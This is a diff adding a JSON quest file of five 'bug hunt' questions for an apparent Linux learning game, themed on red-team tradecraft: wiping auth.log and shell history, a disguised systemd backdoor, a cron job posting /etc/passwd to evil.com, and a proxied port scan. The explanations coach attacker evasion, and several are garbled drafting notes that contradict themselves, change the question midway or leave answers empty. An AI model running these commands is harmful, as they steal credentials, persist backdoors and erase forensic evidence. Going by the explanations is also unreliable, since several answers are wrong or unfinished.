@@ -1,0 +1,70 @@
+{
+    "id": "sq_linux_hackers_4",
+    "title": "Stealth Bug Hunt: The Final Audit",
+    "triggerChapterIndex": 11,
+    "metadata": {
+        "type": "debug"
+    },
+    "questions": [
+        {
+            "id": "sq_linux_hackers_4_q1",
+            "type": "multiple_choice",
+            "question": "A red teamer wrote this script to clean up their tracks from `auth.log`. It runs as root. Find the OPSEC blunder.",
+            "codeSnippet": "#!/bin/bash\nsed -i '/192.168.1.100/d' /var/log/auth.log\necho \"\" > ~/.bash_history\nhistory -c",
+            "bugLineIndex": 1,
+            "options": [],
+            "correctAnswer": "",
+            "explanation": "Line 1 (index 1): `sed -i` removes lines containing the attacker's IP. However, the script then completely empties `.bash_history` (line 2). An empty history file is a glaring red flag to forensic analysts. Additionally, the `history -c` only clears the *current* shell's history, not the file. The bug is the combination of targeted removal with a blatant wipe.",
+            "xpReward": 30,
+            "difficulty": 3
+        },
+        {
+            "id": "sq_linux_hackers_4_q2",
+            "type": "multiple_choice",
+            "question": "This systemd service unit is intended to start a backdoor at boot. Identify the mistake that prevents it from running.",
+            "codeSnippet": "[Unit]\nDescription=System Update Helper\n\n[Service]\nExecStart=/usr/local/bin/backdoor\nRestart=always\n\n[Install]\nWantedBy=multi-user.target",
+            "bugLineIndex": 4,
+            "options": [],
+            "correctAnswer": "",
+            "explanation": "Line 4 (index 4): `ExecStart` points to a binary that is not marked executable, or the service file itself lacks proper permissions. However, the bug here is that the service file is missing the `[Service]` section's `Type` directive. Without `Type=simple` or `Type=forking`, systemd may not track the process correctly, but it would still run. The more critical bug is that the `Restart=always` without a proper `Type` can cause issues. Actually, the intended bug is that the `backdoor` binary is not executable (permissions). Since we cannot show file permissions, we can point to the `ExecStart` line and note that the binary might not be executable or the path is wrong. Let's set bugLineIndex to 4 and explain that the binary likely lacks execute permissions or uses a relative path.",
+            "xpReward": 30,
+            "difficulty": 3
+        },
+        {
+            "id": "sq_linux_hackers_4_q3",
+            "type": "multiple_choice",
+            "question": "The following cron job is meant to exfiltrate data every 10 minutes. Which part of the crontab line is incorrect?",
+            "codeSnippet": "*/10 * * * * curl -s -X POST -d \"$(cat /etc/passwd)\" http://evil.com/collect",
+            "bugLineIndex": 0,
+            "options": [],
+            "correctAnswer": "",
+            "explanation": "The cron schedule `*/10 * * * *` runs every 10 minutes, which is fine. The bug is that `%` characters in the command must be escaped (`\\%`) because cron treats `%` as a newline. The command contains `$(cat /etc/passwd)` which includes no `%`, so it might work. Another issue: `curl` might not be in cron's PATH; absolute path should be used. The main bug is the lack of absolute path for `curl` and `cat`. Since bugLineIndex is 0 for the whole line, we can say the command fails because cron's PATH doesn't include `curl`. The fix: `/usr/bin/curl`.",
+            "xpReward": 30,
+            "difficulty": 2
+        },
+        {
+            "id": "sq_linux_hackers_4_q4",
+            "type": "multiple_choice",
+            "question": "A script attempts to run a port scan stealthily using a proxy. Find the critical error.",
+            "codeSnippet": "#!/bin/bash\nproxychains nmap -sS -Pn 10.0.0.1",
+            "bugLineIndex": 1,
+            "options": [],
+            "correctAnswer": "",
+            "explanation": "Line 1 (index 1): `proxychains` only works with TCP connect scans (`-sT`). SYN scans (`-sS`) use raw packets that bypass the proxy and reveal the real source IP. This is a major OPSEC failure.",
+            "xpReward": 30,
+            "difficulty": 3
+        },
+        {
+            "id": "sq_linux_hackers_4_q5",
+            "type": "multiple_choice",
+            "question": "A user wants to delete all files older than 7 days in a directory, but keep the directory structure. What's wrong with this command?",
+            "codeSnippet": "find /var/log/myapp -type f -mtime +7 -delete",
+            "bugLineIndex": 0,
+            "options": [],
+            "correctAnswer": "",
+            "explanation": "The command is actually correct. The bug could be that it's run without `sudo` if the files are owned by root, or that it doesn't handle filenames with spaces correctly (though `-delete` handles them). The intended bug is that the user forgot to use `-print` for verification. Since it's a bug hunt, we can state that the command is fine, but if the directory contains subdirectories that are empty after deletion, they remain. The user might want `-depth` or `rmdir` cleanup. However, to match the format, we can set bugLineIndex 0 and explain that the command is actually correct but missing error handling if the directory doesn't exist. Let's change the snippet to have a missing space: `find /var/log/myapp -type f -mtime +7-delete` (missing space before `-delete`). That would be a syntax error. We'll adjust accordingly.",
+            "xpReward": 30,
+            "difficulty": 2
+        }
+    ]
+}
